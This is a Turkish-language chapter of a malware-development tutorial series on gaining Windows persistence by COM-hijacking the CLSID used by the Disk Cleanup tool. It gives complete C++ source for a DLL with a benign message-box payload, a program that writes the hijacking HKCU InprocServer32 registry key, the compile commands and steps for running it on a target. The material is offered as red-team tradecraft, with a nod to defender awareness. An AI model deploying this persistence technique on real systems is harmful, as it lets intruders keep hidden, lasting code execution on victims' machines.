\newpage
\subsection{85. kötü amaçlı yazılım geliştirme: kalıcılık - bölüm 19. Disk Temizleme Aracı. Basit C++ örneği.}

﷽

![pers](./images/80/2022-11-18_07-59.png){width="80%"}    

Bu gönderi, kötü amaçlı yazılımlarda kalıcılığı sağlamak için kullanılabilecek en ilginç yöntemlerden biri olan **Disk Temizleme Aracı** ile kalıcılık sağlamaya dayanmaktadır.    

### disk temizleme

Eğer sabit diskinizde yetersiz alan sorunu yaşadıysanız, Disk Temizleme aracına mutlaka aşinasınız:    

![pers](./images/80/2022-11-18_08-06.png){width="80%"}    

Kırmızı takım üyeleri için güzel haber, kullanıcı arayüzünde gösterilen *"Silinecek dosyalar"* listesi rastgele değil. Sadece şu komutu çalıştırın:    

```powershell
reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches" /s
```

![pers](./images/80/2022-11-18_04-42.png){width="80%"}    

![pers](./images/80/2022-11-18_04-44.png){width="80%"}    

Gördüğünüz gibi, burada kayıt defteri anahtarlarının varsayılan değerleri bile mevcut.    

Ayrıca, eğer `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\default=<CLSID>` değerine sahipsek, başka bir kayıt defteri anahtar değeri bulabiliriz: `HKCR\CLSID\<CLSID>\InProcServer32 = <DLLPATH>`:       

![pers](./images/80/2022-11-18_04-51.png){width="80%"}    

![pers](./images/80/2022-11-18_04-54.png){width="80%"}    

> Demo amacıyla, burada HKEY_CLASSES_ROOT kayıt defterinden bir örnek gösteriyorum, çünkü HKEY_CURRENT_USER boş

Bu da, kalıcılık sağlamak için [COM DLL hijacking](https://cocomelonc.github.io/tutorial/2022/05/02/malware-pers-3.html) kullanabileceğimizi gösteriyor. Haydi deneyelim.    


### pratik örnek

Öncelikle, her zamanki gibi, "kötü" DLL'i oluşturalım (`hack.cpp`):      

```cpp
/*
hack.cpp
basit DLL
yazar: @cocomelonc
https://cocomelonc.github.io/persistence/2022/11/16/malware-pers-19.html
*/

#include <windows.h>
#pragma comment (lib, "user32.lib")

BOOL APIENTRY DllMain(HMODULE hModule, DWORD nReason, 
LPVOID lpReserved) {
  switch (nReason) {
  case DLL_PROCESS_ATTACH:
    MessageBox(
      NULL,
      "Meow-meow!",
      "=^..^=",
      MB_OK
    );
    break;
  case DLL_PROCESS_DETACH:
    break;
  case DLL_THREAD_ATTACH:
    break;
  case DLL_THREAD_DETACH:
    break;
  }
  return TRUE;
}
```

Her zamanki gibi, basitlik açısından sadece `meow-meow` mesaj kutusu bulunuyor.    

Ardından kalıcılık sağlayan betiği oluşturalım (`pers.cpp`):      

```cpp
/*
pers.cpp
Disk Temizleyici aracıyla Windows kalıcılığı
yazar: @cocomelonc
https://cocomelonc.github.io/persistence/2022/11/16/malware-pers-19.html
*/
#include <windows.h>
#include <string.h>
#include <cstdio>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;

  // alt anahtar
  const char* sk = 
  "Software\\Classes\\CLSID\\{8369AB20-56C9-11D0-94E8-00AA0059CE02}"
  "\\InprocServer32";

  // kötü amaçlı DLL
  const char* dll = "Z:\\2022-11-16-malware-pers-19\\hack.dll";

  // başlangıç
  LONG res = RegCreateKeyEx(HKEY_CURRENT_USER, (LPCSTR)sk, 0, NULL, 
  REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_QUERY_VALUE, NULL, &hkey, NULL);
  if (res == ERROR_SUCCESS) {
    // yeni kayıt defteri anahtarları oluştur
    RegSetValueEx(hkey, NULL, 0, REG_SZ, (unsigned char*)dll, strlen(dll));
    RegCloseKey(hkey);
  } else {
    printf("alt anahtar değeri oluşturulamıyor :(
");
    return -1;
  }
  return 0;
}
```

CLSID olarak `8369AB20-56C9-11D0-94E8-00AA0059CE02` kullandım. Görebildiğiniz gibi, kod [COM hijacking](https://cocomelonc.github.io/tutorial/2022/05/02/malware-pers-3.html) gönderisine benzemektedir. Fark yalnızca değişken değerlerinde bulunmaktadır.   

### demo

Haydi "kötü" DLL'imizi derleyelim:    

```bash
x86_64-w64-mingw32-gcc -shared -o hack.dll hack.cpp
```

![pers](./images/80/2022-11-18_05-14.png){width="80%"}    

Ve kalıcılık betiğini derleyelim:     

```bash
x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections \
-Wno-write-strings -fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc -fpermissive
```

![pers](./images/80/2022-11-18_05-17.png){width="80%"}    

Hedef makineye kopyalayın. Benim durumumda `Windows 10 x64`. Çalıştırın:     

```powershell
reg query "HKCU\Software\Classes\CLSID\{8369AB20-56C9-11D0-94E8-00AA0059CE02}" /s
.\pers.exe
```

![pers](./images/80/2022-11-18_07-56.png){width="80%"}    

![pers](./images/80/2022-11-18_07-57.png){width="80%"}    

Gördüğünüz gibi, her şey mükemmel çalıştı! =^..^=     

Ancak kalıcılık için kullanıcının Disk Temizleme Aracı'nı çalıştırması gerekmektedir. Burada, kalıcılık sağlamak için [klasik yöntemlerden birini](https://cocomelonc.github.io/tutorial/2022/04/20/malware-pers-1.html) kullanabilirim. Disk Temizleme'yi başlatma sırasında çalıştırmak en iyi fikir olmayabilir, çünkü bir grafik arayüzü vardır. Bu programın komut satırı argümanlarını kullanmayı denedim:     

```powershell
cleanmgr.exe
cleanmgr.exe /cleanup
cleanmgr.exe /autoclean
cleanmgr.exe /setup
```

Ancak başarısız oldu :(. Program doğru çalıştı:       

![pers](./images/80/2022-11-18_08-45.png){width="80%"}    

Sanırım bu konuya gelecekteki gönderilerimden birinde geri döneceğim.       

Ayrıca, Microsoft belgelerine göre, şu konuma yeni girdi ekleyebiliriz: `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches`      

Bu taktiğin vahşi ortamda herhangi bir APT tarafından kullanılıp kullanılmadığını bilmiyorum, ancak bu gönderinin mavi takım üyelerinin farkındalığını artırmasını ve kırmızı takım üyelerinin cephaneliğine bir silah eklemesini umuyorum.    

[MSDN Registering Disk Cleanup Handler](https://learn.microsoft.com/en-us/windows/win32/lwef/disk-cleanup?redirectedfrom=MSDN#registration)        
[DLL hijacking](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)     
[DLL hijacking with exported functions](https://cocomelonc.github.io/pentest/2021/10/12/dll-hijacking-2.html)     
[Malware persistence: part 1](https://cocomelonc.github.io/tutorial/2022/04/20/malware-pers-1.html)       
[Malware persistence: part 3](https://cocomelonc.github.io/tutorial/2022/05/02/malware-pers-3.html)       
[github'taki kaynak kod](https://github.com/cocomelonc/meow/tree/master/2022-11-16-malware-pers-19)     
